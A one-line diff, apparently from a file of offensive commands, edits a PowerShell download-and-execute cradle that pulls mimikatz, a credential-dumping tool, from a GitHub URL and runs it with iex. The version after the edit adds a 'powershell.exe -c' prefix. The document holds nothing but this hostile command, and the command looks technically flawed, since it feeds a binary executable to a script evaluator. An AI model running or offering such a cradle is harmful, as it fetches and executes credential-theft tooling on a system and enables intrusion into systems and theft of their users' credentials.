@@ -1,1 +1,1 @@
-iex(New-Object Net.webclient).downloadstring('https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe')
+powershell.exe -c iex(New-Object Net.webclient).downloadstring('https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe')
